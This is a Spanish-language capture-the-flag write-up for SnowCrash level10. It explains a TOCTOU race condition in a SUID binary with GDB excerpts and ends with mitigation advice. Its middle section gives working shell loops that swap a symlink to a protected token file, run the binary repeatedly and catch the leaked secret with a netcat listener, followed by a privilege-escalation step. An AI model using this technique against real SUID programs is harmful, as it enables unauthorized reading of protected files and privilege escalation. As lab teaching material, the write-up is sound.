# 🚩 SnowCrash Level 10: Informe de Explotación de Race Condition (TOCTOU)

Este nivel presenta una vulnerabilidad de **Condición de Carrera** de tipo **TOCTOU** (*Time-of-Check to Time-of-Use*). El binario verifica los permisos de un archivo antes de abrirlo, creando una ventana de oportunidad para intercambiar el objetivo.

## 🔍 Análisis Técnico con GDB

Al desensamblar la función `main` (`gdb ./level10` -> `disas main`), identificamos el flujo lógico que permite la explotación:

### 1. La Comprobación Lógica (`access`)
En la dirección `0x08048749`, el programa invoca a `access@plt`. 
*   **Contexto:** `access()` comprueba los permisos basados en el **UID Real** (nosotros, `level10`).
*   **Paso en GDB:**
    ```asm
    0x0804873e <+106>: movl   $0x4,0x4(%esp)  ; Flag R_OK (verificar lectura)
    0x08048746 <+114>: mov    %eax,(%esp)      ; %eax contiene la ruta del archivo
    0x08048749 <+117>: call   0x80485e0 <access@plt>
    ```
Si el archivo es `token`  (del que no tenemos permiso de lectura como level10), esta llamada devuelve `-1` y el programa aborta. Por eso, el enlace simbólico debe apuntar a un archivo que **SÍ** podamos leer en este preciso instante.

### 2. La Ventana Crítica (Time Gap)
Tras el chequeo, el binario ejecuta una serie de instrucciones costosas en tiempo:
*   `0x0804878f`: Llamada a `socket()` para crear la conexión.
*   `0x08048805`: Llamada a `connect()` para establecer el túnel TCP al host.
*   `0x08048847`: Llamada a `write()` para enviar el banner ".*".

Este intervalo de tiempo es nuestra **ventana de explotación**. El estado del sistema de archivos no es atómico entre el chequeo y el uso.

### 3. La Apertura Privilegiada (`open`)
En la dirección `0x0804889b`, el programa finalmente abre el archivo:
```asm
0x0804889b <+455>: call   0x80485a0 <open@plt>



## 🔍 Análisis de la Vulnerabilidad

Al analizar el binario `level10` con `gdb` o `ltrace`, observamos el siguiente flujo de ejecución:

1.  **Check (`access`)**: El programa usa la función `access()` para verificar si el usuario real (nosotros) tiene permisos de lectura sobre el archivo proporcionado.
2.  **Use (`open`)**: Si la comprobación anterior es exitosa, el programa abre el archivo usando `open()` para enviarlo a través de un socket de red.

**El problema:** El binario tiene el bit **SUID** de `flag10`. Mientras que `access()` comprueba nuestros permisos reales (denegando el acceso a `token`), `open()` se ejecuta con los privilegios del dueño del archivo (`flag10`). Si logramos cambiar el archivo entre el paso 1 y el paso 2, el programa abrirá el `token` legítimo creyendo que es un archivo inofensivo.

## 🛠️ Metodología de Explotación

Para ganar la carrera (Race Condition), debemos ejecutar tres procesos en paralelo que fuercen la colisión entre el chequeo de permisos y la apertura del archivo:

### 1. El Receptor (Terminal A)
Preparamos un servidor `netcat` para escuchar en el puerto **6969** (puerto por defecto del binario) y capturar los datos enviados por el socket.
```bash
while true; do nc -lk 6969; done
```

### 2. El "Intercambiador" de Enlaces (Terminal B)
Para ganar la carrera (Race Condition), creamos un bucle que alterna el destino del enlace simbólico miles de veces por segundo. Esto busca que `access()` vea el archivo legítimo y `open()` abra el secreto.
```bash
touch /tmp/fake
while true; do
    ln -sf /tmp/fake /tmp/exploit
    ln -sf /home/user/level10/token /tmp/exploit
done
```
### 3. El Ejecutor (Terminal C)
Lanzamos el binario repetidamente en un bucle infinito, apuntando al enlace simbólico que estamos rotando y a nuestra propia dirección IP local.
```bash
while true; do ./level10 /tmp/exploit 127.0.0.1; done
```
---

## 🚀 Obtención de la Flag

1.  Mantén los tres procesos corriendo simultáneamente en terminales separadas.
2.  Observa la **Terminal A** (la de `nc`). Verás ráfagas con el contenido del archivo `/tmp/fake`.
3.  En el momento en que se gane la carrera (cuando el enlace apunte a `token` justo después del chequeo de `access` pero antes de `open`), aparecerá una cadena alfanumérica distinta: **`woupa2yuo99scw7v6i9p9p16m`** (ejemplo).
4.  Copia esa contraseña y utilízala para escalar privilegios:
    ```bash
    su flag10
    # [Introduce la contraseña capturada]
    getflag
    ```

---

## 🛡️ Prevención y Mitigación

*   **Evitar `access()`**: En programas con privilegios **SUID**, nunca se debe usar la secuencia `access()` seguida de `open()`. Esta combinación no es una operación atómica y es la raíz de la vulnerabilidad.
*   **Bajar Privilegios**: El programa debe usar `setreuid(getuid(), getuid())` para asumir la identidad del usuario real antes de intentar abrir cualquier archivo proporcionado por el usuario.
*   **Flags de Apertura**: Utilizar el flag `O_NOFOLLOW` en la función `open()` para evitar que el programa procese enlaces simbólicos de forma malintencionada.

